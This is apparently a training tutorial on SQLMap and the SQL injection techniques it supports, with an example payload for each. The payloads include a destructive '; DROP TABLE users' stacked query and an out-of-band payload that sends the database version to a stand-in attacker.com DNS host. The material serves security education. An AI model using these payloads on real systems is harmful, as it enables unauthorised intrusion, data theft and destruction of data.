

# SQLMap Overview

SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL Injection (SQLi) vulnerabilities.

Instead of manually testing payloads like:

```sql
' OR 1=1--
```

SQLMap:

- detects injectable parameters
    
- identifies database type
    
- determines SQLi type
    
- extracts database information automatically
    

It supports:

- MySQL
    
- PostgreSQL
    
- MSSQL
    
- Oracle
    
- SQLite
    
- MariaDB
    
- many others
    

---

# Basic SQLMap Command

```bash
python sqlmap.py -u "http://inlanefreight.htb/page.php?id=5"
```

## Detailed Explanation

|Part|Explanation|
|---|---|
|`python sqlmap.py`|Runs SQLMap Python script|
|`-u`|Specifies target URL|
|`id=5`|Parameter SQLMap will test|

SQLMap mainly targets:

- GET parameters
    
- POST parameters
    
- cookies
    
- headers
    

Here:

```text
id=5
```

is the injectable parameter candidate.

---

# What SQLMap Does Internally

When SQLMap starts, it performs several automated checks.

---

## 1. Connection Testing

```text
testing connection to the target URL
```

SQLMap first checks:

- whether website is reachable
    
- whether response is valid
    
- whether page loads correctly
    

Without stable connectivity:

- SQLi testing becomes unreliable.
    

---

## 2. WAF/IPS/IDS Detection

```text
checking if the target is protected by some kind of WAF/IPS/IDS
```

SQLMap checks if:

- Web Application Firewall (WAF)
    
- Intrusion Detection System (IDS)
    
- Intrusion Prevention System (IPS)
    

is filtering requests.

This is important because:

- WAFs block common SQLi payloads
    
- SQLMap may need tamper scripts later
    

Example:

- Cloudflare
    
- ModSecurity
    
- AWS WAF
    

---

## 3. Page Stability Check

```text
target URL content is stable
```

SQLMap compares multiple responses from the same page.

Purpose:

- determine whether page changes naturally
    
- avoid false positives
    

Example:  
If website displays random ads/timestamps:

- SQLMap may incorrectly think payload changed response.
    

Stable responses are necessary for:

- Boolean-based blind SQLi
    
- Time-based SQLi
    

---

## 4. Dynamic Parameter Detection

```text
GET parameter 'id' is dynamic
```

This means:

- changing parameter value changes webpage output.
    

Example:

```text
?id=1
?id=2
?id=5
```

If responses differ:

- parameter is dynamic
    
- SQLMap proceeds with injection testing
    

If parameter is static:

- SQLMap may skip it because no backend query interaction exists.

# SQL Injection Techniques Supported by SQLMap

SQLMap supports all major SQL Injection techniques.

Command:

```bash
sqlmap -hh
```

Output:

```text
BEUSTQ
```

Each letter represents one SQLi type.

---

# 1. Boolean-Based Blind SQL Injection (B)

## Example Payload

```sql
AND 1=1
```

FALSE condition:

```sql
AND 1=2
```

---

## How It Works

SQLMap injects:

- TRUE condition
    
- FALSE condition
    

and compares responses.

Example:

### Original Query

```sql
SELECT * FROM products WHERE id=5
```

### Injected Query

```sql
SELECT * FROM products WHERE id=5 AND 1=1
```

TRUE:

- normal page loads
    

FALSE:

```sql
SELECT * FROM products WHERE id=5 AND 1=2
```

- empty page
    
- different content
    
- different response length
    

SQLMap detects this difference.

---

## Important Points

- Most common SQLi type
    
- Works even without visible SQL errors
    
- Very reliable
    
- Slow because data extracted bit-by-bit
    

SQLMap determines data using:

- content length
    
- HTTP status codes
    
- text comparison
    
- page titles
    

---

# 2. Error-Based SQL Injection (E)

## Example Payload

```sql
AND GTID_SUBSET(@@version,0)
```

---

## How It Works

SQLMap intentionally triggers database errors.

Example:

- invalid function usage
    
- type mismatch
    
- malformed query
    

Database returns:

```text
SQL syntax error near...
```

or leaks:

```text
MySQL version 8.0.32
```

---

## Understanding Payload

```sql
GTID_SUBSET(@@version,0)
```

|Part|Explanation|
|---|---|
|`@@version`|Retrieves DB version|
|`GTID_SUBSET()`|MySQL function|
|invalid argument|Forces database error|

Error message leaks information.

---

## Important Points

- Faster than blind SQLi
    
- Can retrieve larger chunks of data
    
- Requires database errors to be visible
    

---

# 3. UNION Query-Based SQL Injection (U)

## Example Payload

```sql
UNION ALL SELECT 1,@@version,3
```

---

## How It Works

`UNION` combines results from two queries.

---

### Original Query

```sql
SELECT name,price,description FROM products WHERE id=5
```

---

### Injected Query

```sql
SELECT name,price,description FROM products WHERE id=5
UNION ALL SELECT 1,@@version,3
```

---

## Understanding Payload

|Part|Explanation|
|---|---|
|`UNION`|Combines query outputs|
|`ALL`|Includes all rows|
|`1,@@version,3`|Matches column count|

`@@version` output appears directly on webpage.

---

## Important Points

- Fastest SQLi technique
    
- Direct data extraction
    
- Requires:
    
    - visible query output
        
    - correct column count
        

---

# 4. Stacked Queries (S)

## Example Payload

```sql
; DROP TABLE users
```

---

## How It Works

Stacked queries execute multiple SQL statements in one request.

---

### Example

```sql
SELECT * FROM users WHERE id=1;
DROP TABLE users
```

First query executes normally.

Second query executes separately.

---

## Why Important

Allows:

- INSERT
    
- UPDATE
    
- DELETE
    
- OS command execution
    

Used heavily in:

- MSSQL
    
- PostgreSQL
    

---

## Important Points

- Dangerous SQLi type
    
- Enables advanced exploitation
    
- Not supported everywhere
    

---

# 5. Time-Based Blind SQL Injection (T)

## Example Payload

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

---

## How It Works

Instead of observing page content:

- SQLMap measures response time.
    

---

## Understanding Payload

|Part|Explanation|
|---|---|
|`IF(2>1)`|TRUE condition|
|`SLEEP(5)`|Delay response|
|`0`|No delay if FALSE|

If response delays 5 seconds:

- condition evaluated TRUE
    

---

## Important Points

- Used when:
    
    - no errors
        
    - no visible output
        
- Very slow
    
- Highly reliable in blind scenarios
    

---

# 6. Inline Queries (Q)

## Example Payload

```sql
SELECT (SELECT @@version)
```

---

## How It Works

A query is embedded inside another query.

Inner query executes first:

```sql
SELECT @@version
```

Result passed to outer query.

---

## Important Points

- Rare SQLi type
    
- Depends heavily on application query structure
    

---

# 7. Out-of-Band SQL Injection (OOB)

## Example Payload

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

---

## How It Works

Instead of returning data in webpage:

- database sends DNS/network request to attacker.
    

---

## Understanding Payload

|Part|Explanation|
|---|---|
|`LOAD_FILE()`|Reads file/network path|
|`CONCAT()`|Combines strings|
|`@@version`|Database version|
|`attacker.com`|Attacker-controlled domain|

Generated request:

```text
8.0.32.attacker.com
```

Attacker DNS server captures:

- database version
    

---

## Important Points

- Advanced SQLi technique
    
- Used when:
    
    - normal extraction blocked
        
    - blind extraction too slow
        
- Requires attacker-controlled DNS server
